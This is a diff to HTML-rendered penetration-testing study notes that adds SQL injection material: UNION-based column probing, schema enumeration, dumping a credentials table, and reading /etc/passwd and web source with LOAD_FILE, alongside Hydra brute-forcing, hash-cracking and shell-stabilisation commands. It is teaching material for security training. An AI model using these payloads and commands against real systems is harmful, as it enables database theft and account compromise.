@@ -330,10 +330,21 @@ Gathering</a>
 <li><a href="#sqli-discovery" id="toc-sqli-discovery"><span class="toc-section-number">1.7.8.2</span> SQLi Discovery</a></li>
 <li><a href="#comments" id="toc-comments"><span class="toc-section-number">1.7.8.3</span> Comments</a></li>
 <li><a href="#union-clause" id="toc-union-clause"><span class="toc-section-number">1.7.8.4</span> Union Clause</a></li>
+<li><a href="#union-injection" id="toc-union-injection"><span class="toc-section-number">1.7.8.5</span> Union Injection</a></li>
+<li><a href="#enumeration" id="toc-enumeration"><span class="toc-section-number">1.7.8.6</span> Enumeration</a></li>
+<li><a href="#reading-files" id="toc-reading-files"><span class="toc-section-number">1.7.8.7</span> Reading Files</a>
+<ul>
+<li><a href="#user-privileges" id="toc-user-privileges"><span class="toc-section-number">1.7.8.7.1</span> User Privileges</a></li>
+<li><a href="#load_file" id="toc-load_file"><span class="toc-section-number">1.7.8.7.2</span> LOAD_FILE</a></li>
 </ul></li>
-<li><a href="#mysql" id="toc-mysql"><span class="toc-section-number">1.7.9</span> MySQL</a></li>
-<li><a href="#john-the-ripper" id="toc-john-the-ripper"><span class="toc-section-number">1.7.10</span> John the Ripper</a></li>
-<li><a href="#hashcat" id="toc-hashcat"><span class="toc-section-number">1.7.11</span> Hashcat</a></li>
+<li><a href="#writing-files" id="toc-writing-files"><span class="toc-section-number">1.7.8.8</span> Writing Files</a></li>
+</ul></li>
+<li><a href="#mysql" id="toc-mysql"><span class="toc-section-number">1.7.9</span> MySQL</a>
+<ul>
+<li><a href="#cracking-credentials" id="toc-cracking-credentials"><span class="toc-section-number">1.7.9.1</span> Cracking Credentials</a></li>
+<li><a href="#cheat-sheets" id="toc-cheat-sheets"><span class="toc-section-number">1.7.9.2</span> Cheat Sheets</a></li>
+</ul></li>
+<li><a href="#hashcat" id="toc-hashcat"><span class="toc-section-number">1.7.10</span> Hashcat</a></li>
 </ul></li>
 <li><a href="#web-fundamentals" id="toc-web-fundamentals"><span class="toc-section-number">1.8</span> Web Fundamentals</a>
 <ul>
@@ -1233,11 +1244,135 @@ data type on the selected columns are the same.</p>
 union it with another single column. In that case, we have to add
 another column and fill it with junk. For example <code>NULL</code>,
 because it fits all data types.</p>
-<div class="sourceCode" id="cb66"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb66-1"><a href="#cb66-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">from</span> products <span class="kw">where</span> product_id <span class="op">=</span> <span class="st">&#39;1&#39;</span> <span class="kw">UNION</span> <span class="kw">SELECT</span> username, <span class="dv">2</span> <span class="kw">from</span> passwords</span></code></pre></div>
+<div class="sourceCode" id="cb66"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb66-1"><a href="#cb66-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">from</span> products <span class="kw">where</span> product_id <span class="op">=</span> <span class="st">&#39;1&#39;</span> <span class="kw">UNION</span> <span class="kw">SELECT</span> username, <span class="kw">NULL</span> <span class="kw">from</span> passwords</span></code></pre></div>
+<h4 data-number="1.7.8.5" id="union-injection"><span class="header-section-number">1.7.8.5</span> Union Injection</h4>
+<p>To check the amount of columns we can use the <code>ORDER BY</code>
+or <code>UNION</code> function. If we exceed the number of columns we
+generate an error and therefore know the maximum number.</p>
+<div class="sourceCode" id="cb67"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb67-1"><a href="#cb67-1" aria-hidden="true" tabindex="-1"></a>anything<span class="st">&#39; UNION select 1,2,3-- </span></span></code></pre></div>
+<pre class="test"><code>Dont forget the whitespace after the double dash!</code></pre>
+<p>As a part of our <code>UNION</code> injection we can try to determine
+more information about the database.</p>
+<table>
+<colgroup>
+<col style="width: 50%" />
+<col style="width: 50%" />
+</colgroup>
+<thead>
+<tr class="header">
+<th>Information</th>
+<th>Payload</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>Comments</td>
+<td><code>SELECT @@version</code></td>
+</tr>
+<tr class="even">
+<td>Current User</td>
+<td><code>SELECT user();</code>, <code>SELECT system_user();</code></td>
+</tr>
+<tr class="odd">
+<td>List Users</td>
+<td><code>SELECT user FROM mysql.user; — priv</code></td>
+</tr>
+<tr class="even">
+<td>List Password Hashes</td>
+<td><code>SELECT host, user, password FROM mysql.user; — priv</code></td>
+</tr>
+</tbody>
+</table>
+<h4 data-number="1.7.8.6" id="enumeration"><span class="header-section-number">1.7.8.6</span> Enumeration</h4>
+<p>To get data with a <code>UNION SELECT</code> we need to create proper
+<code>SELECT</code> queries. Therefor it is essential for us to know the
+schema conditions. This can be realized by enumeration.</p>
+<p>In our first step, we want to know what databases are present on the
+system. A matching injection could look like the following:</p>
+<div class="sourceCode" id="cb69"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb69-1"><a href="#cb69-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- </span></span></code></pre></div>
+<p>Now that we have an overview of the databases, let’s see which one we
+are in.</p>
+<div class="sourceCode" id="cb70"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb70-1"><a href="#cb70-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; UNION select 1,database(),2,3-- </span></span></code></pre></div>
+<p>An overview over the different tables could look like the
+following:</p>
+<div class="sourceCode" id="cb71"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb71-1"><a href="#cb71-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema=&#39;</span>dev<span class="st">&#39;-- </span></span></code></pre></div>
+<p>The last information that we need are the name of the columns.</p>
+<div class="sourceCode" id="cb72"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb72-1"><a href="#cb72-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name=&#39;</span>credentials<span class="st">&#39;-- </span></span></code></pre></div>
+<p>Now that we have all the information, we can start querying data.</p>
+<div class="sourceCode" id="cb73"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb73-1"><a href="#cb73-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; UNION select 1, username, password, 4 from dev.credentials-- </span></span></code></pre></div>
+<h4 data-number="1.7.8.7" id="reading-files"><span class="header-section-number">1.7.8.7</span> Reading Files</h4>
+<p>There are two ways (<code>UNION SELECT</code> or <code>SELECT</code>)
+to check which rights our user has.</p>
+<div class="sourceCode" id="cb74"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb74-1"><a href="#cb74-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="fu">USER</span>()</span>
+<span id="cb74-2"><a href="#cb74-2" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> CURRENT_USER()</span>
+<span id="cb74-3"><a href="#cb74-3" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="fu">user</span> <span class="kw">from</span> mysql.<span class="fu">user</span></span></code></pre></div>
+<div class="sourceCode" id="cb75"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb75-1"><a href="#cb75-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; UNION SELECT 1, user(), 3, 4-- </span></span></code></pre></div>
+<div class="sourceCode" id="cb76"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb76-1"><a href="#cb76-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; UNION SELECT 1, user, 3, 4 from mysql.user-- </span></span></code></pre></div>
+<h5 data-number="1.7.8.7.1" id="user-privileges"><span class="header-section-number">1.7.8.7.1</span> User Privileges</h5>
+<p>Now that we know our user, we need to know which privileges he
+has.</p>
+<div class="sourceCode" id="cb77"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb77-1"><a href="#cb77-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> super_priv <span class="kw">FROM</span> mysql.<span class="fu">user</span></span></code></pre></div>
+<div class="sourceCode" id="cb78"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb78-1"><a href="#cb78-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- </span></span></code></pre></div>
+<p>When we have several users we can only show the privileges of the
+searched user.</p>
+<div class="sourceCode" id="cb79"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb79-1"><a href="#cb79-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user=&quot;larry&quot;-- </span></span></code></pre></div>
+<p>To check other privileges then the root user privilege we can use one
+of the following command.</p>
+<div class="sourceCode" id="cb80"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb80-1"><a href="#cb80-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> sql_grants <span class="kw">FROM</span> information_schema.sql_show_grants</span></code></pre></div>
+<div class="sourceCode" id="cb81"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb81-1"><a href="#cb81-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- </span></span></code></pre></div>
+<h5 data-number="1.7.8.7.2" id="load_file"><span class="header-section-number">1.7.8.7.2</span> LOAD_FILE</h5>
+<p>If the OS user has enough privileges we can use the
+<code>LOAD_FILE()</code> function to read files from the system.</p>
+<div class="sourceCode" id="cb82"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb82-1"><a href="#cb82-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> LOAD_FILE(<span class="st">&#39;/etc/passwd&#39;</span>);</span></code></pre></div>
+<div class="sourceCode" id="cb83"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb83-1"><a href="#cb83-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; UNION SELECT 1, LOAD_FILE(&quot;/etc/passwd&quot;), 3, 4-- </span></span></code></pre></div>
+<div class="sourceCode" id="cb84"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb84-1"><a href="#cb84-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; UNION SELECT 1, LOAD_FILE(&quot;/var/www/html/search.php&quot;), 3, 4-- </span></span></code></pre></div>
+<p>To see the Code press <code>[Ctrl + U]</code>.</p>
+<h4 data-number="1.7.8.8" id="writing-files"><span class="header-section-number">1.7.8.8</span> Writing Files</h4>
+<p>Requirements: 1. User with <code>FILE</code> privilege enabled 2.
+MySQL global <code>secure_file_priv</code> variable not enabled 3. Write
+access to the location we want to write to on the back-end server</p>
 <h3 data-number="1.7.9" id="mysql"><span class="header-section-number">1.7.9</span> MySQL</h3>
+<p>To ensure that we are working with a <code>MySQL</code> Server we can
+use the following commands.</p>
+<table>
+<colgroup>
+<col style="width: 25%" />
+<col style="width: 25%" />
+<col style="width: 25%" />
+<col style="width: 25%" />
+</colgroup>
+<thead>
+<tr class="header">
+<th>Payload</th>
+<th>When to Use</th>
+<th>Expected Output</th>
+<th>Wrong Output</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td><code>SELECT @@version</code></td>
+<td>When we have full query output</td>
+<td>MySQL Version ‘i.e. <code>10.3.22-MariaDB-1ubuntu1</code>’</td>
+<td>In MSSQL it returns MSSQL version. Error with other DBMS.</td>
+</tr>
+<tr class="even">
+<td><code>SELECT POW(1,1)</code></td>
+<td>When we only have numeric output</td>
+<td><code>1</code></td>
+<td>Error with other DBMS</td>
+</tr>
+<tr class="odd">
+<td><code>SELECT SLEEP(5)</code></td>
+<td>Blind/No Output</td>
+<td>Delays page response for 5 seconds and returns <code>0</code>.</td>
+<td>Will not delay response with other DBMS</td>
+</tr>
+</tbody>
+</table>
 <p>First we need a client, which is in our case
 <code>default-mysql-client</code>:</p>
-<div class="sourceCode" id="cb67"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb67-1"><a href="#cb67-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> mysql <span class="at">-h</span> [IP] <span class="at">-P</span> [port] <span class="at">-u</span> [username] <span class="at">-p</span></span></code></pre></div>
+<div class="sourceCode" id="cb85"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb85-1"><a href="#cb85-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> mysql <span class="at">-h</span> [IP] <span class="at">-P</span> [port] <span class="at">-u</span> [username] <span class="at">-p</span></span></code></pre></div>
 <pre class="text"><code>*(-h [IP]        = Connect to the MariaDB server on the given host
   -u [username]  = The MariaDB user name to use when connecting to the server
   -P [port]      = The port to use for the connection
@@ -1248,32 +1383,36 @@ because it fits all data types.</p>
 <li><code>SHOW TABLES;</code></li>
 <li><code>SELECT * FROM &lt;tablename&gt;;</code></li>
 </ol>
+<h4 data-number="1.7.9.1" id="cracking-credentials"><span class="header-section-number">1.7.9.1</span> Cracking Credentials</h4>
 <p>If we do not have any credentials we can use <code>Nmap</code> or
 <code>Metasplot</code> to gain this information:</p>
-<div class="sourceCode" id="cb69"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb69-1"><a href="#cb69-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> nmap <span class="at">--script</span><span class="op">=</span>mysql-enum [target]</span></code></pre></div>
+<div class="sourceCode" id="cb87"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb87-1"><a href="#cb87-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> nmap <span class="at">--script</span><span class="op">=</span>mysql-enum [target]</span></code></pre></div>
 <pre class="text"><code>*(--script=mysql-enum           = Scan with a single script: mysql-enum
   [target]                      = The IP address of the target)</code></pre>
 <p>Now that we know some usernames of the database, we can try to crack
 the passwords of them with <code>Hydra</code>:</p>
-<div class="sourceCode" id="cb71"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb71-1"><a href="#cb71-1" aria-hidden="true" tabindex="-1"></a><span class="ex">hydra</span> <span class="at">-t</span> 16 <span class="at">-l</span> root <span class="at">-P</span> /usr/share/wordlists/rockyou.txt <span class="at">-vV</span> 10.10.6.199 mysql</span></code></pre></div>
+<div class="sourceCode" id="cb89"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb89-1"><a href="#cb89-1" aria-hidden="true" tabindex="-1"></a><span class="ex">hydra</span> <span class="at">-t</span> 16 <span class="at">-l</span> root <span class="at">-P</span> /usr/share/wordlists/rockyou.txt <span class="at">-vV</span> 10.10.6.199 mysql</span></code></pre></div>
 <pre class="text"><code>*(-t 16     = Number of parallel connections per target
   -l [user] = Points to the user who&#39;s account you&#39;re trying to compromise
   -P [file] = Points to the file containing the list of possible passwords
   -vV       = Very verbose: shows the login+pass combination for each attempt
   [IP]      = The IP address of the target machine
   [mysql]   = Sets the protocol)</code></pre>
-<h3 data-number="1.7.10" id="john-the-ripper"><span class="header-section-number">1.7.10</span> John the Ripper</h3>
-<p>If we have a hash which look something like the following
-example:</p>
+<h4 data-number="1.7.9.2" id="cheat-sheets"><span class="header-section-number">1.7.9.2</span> Cheat Sheets</h4>
+<ul>
+<li><a href="https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet">pentestmonkey.net</a>
+### John the Ripper If we have a hash which look something like the
+following example:</li>
+</ul>
 <pre><code>carl:*EA031893AA21444B170FC2162A56978B8CEECE18</code></pre>
 <p>We can pipe the hash in a file:</p>
-<div class="sourceCode" id="cb74"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb74-1"><a href="#cb74-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> echo carl:<span class="pp">*</span>EA031893AA21444B170FC2162A56978B8CEECE18 <span class="op">&gt;</span> hash.txt</span></code></pre></div>
+<div class="sourceCode" id="cb92"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb92-1"><a href="#cb92-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> echo carl:<span class="pp">*</span>EA031893AA21444B170FC2162A56978B8CEECE18 <span class="op">&gt;</span> hash.txt</span></code></pre></div>
 <p>And crack the password with <code>John the Ripper</code>:</p>
-<div class="sourceCode" id="cb75"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb75-1"><a href="#cb75-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> john hash.txt</span>
-<span id="cb75-2"><a href="#cb75-2" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> john <span class="at">--show</span> <span class="at">--format</span><span class="op">=</span>RAW-MD5 hash.txt</span></code></pre></div>
+<div class="sourceCode" id="cb93"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb93-1"><a href="#cb93-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> john hash.txt</span>
+<span id="cb93-2"><a href="#cb93-2" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> john <span class="at">--show</span> <span class="at">--format</span><span class="op">=</span>RAW-MD5 hash.txt</span></code></pre></div>
 <pre class="text"><code>*(--show            = show cracked passwords
   --format=&lt;param&gt;  = force hash type: descrypt, bsdicrypt, md5crypt, RAW-MD5, bcrypt, LM, AFS, tripcode, dummy, and crypt</code></pre>
-<h3 data-number="1.7.11" id="hashcat"><span class="header-section-number">1.7.11</span> Hashcat</h3>
+<h3 data-number="1.7.10" id="hashcat"><span class="header-section-number">1.7.10</span> Hashcat</h3>
 <pre class="shell"><code>$ hashcat --force -m 500 -a 0 -o found1.txt --remove puthasheshere.hash /usr/share/wordlists/rockyou.txt</code></pre>
 <h2 data-number="1.8" id="web-fundamentals"><span class="header-section-number">1.8</span> Web Fundamentals</h2>
 <h3 data-number="1.8.1" id="http"><span class="header-section-number">1.8.1</span> HTTP</h3>
@@ -1409,7 +1548,7 @@ source.</p>
   [target]          = The URL of the webpage we want to fetch
   -d [param]        = Sends the specified data in a POST  request  to  the HTTP server)</code></pre>
 <p>We can also save files with the <code>-0</code> flag:</p>
-<div class="sourceCode" id="cb98"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb98-1"><a href="#cb98-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> curl <span class="at">-O</span> inlanefreight.com/index.html <span class="at">-o</span> home.html <span class="at">-s</span> <span class="at">-v</span></span></code></pre></div>
+<div class="sourceCode" id="cb116"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb116-1"><a href="#cb116-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> curl <span class="at">-O</span> inlanefreight.com/index.html <span class="at">-o</span> home.html <span class="at">-s</span> <span class="at">-v</span></span></code></pre></div>
 <pre class="text"><code>*(-0    = Save the output into a file
   -o    = Sepcify the filename
   -s    = Silent the status
@@ -1448,7 +1587,7 @@ Shell</li>
 <h4 data-number="1.8.3.3" id="stabilize-shell"><span class="header-section-number">1.8.3.3</span> Stabilize Shell</h4>
 <p>You can stabilize the shell with the python module
 <code>pty</code>:</p>
-<div class="sourceCode" id="cb105"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb105-1"><a href="#cb105-1" aria-hidden="true" tabindex="-1"></a>python <span class="op">-</span>c <span class="st">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span></span></code></pre></div>
+<div class="sourceCode" id="cb123"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb123-1"><a href="#cb123-1" aria-hidden="true" tabindex="-1"></a>python <span class="op">-</span>c <span class="st">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span></span></code></pre></div>
 <p>For more information checkout the following GitHub repo: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">PayloadsAllTheThings</a></p>
 <p>If you gain access depending on the OS you can try the following
 commands to get more information: &gt;Linux</p>
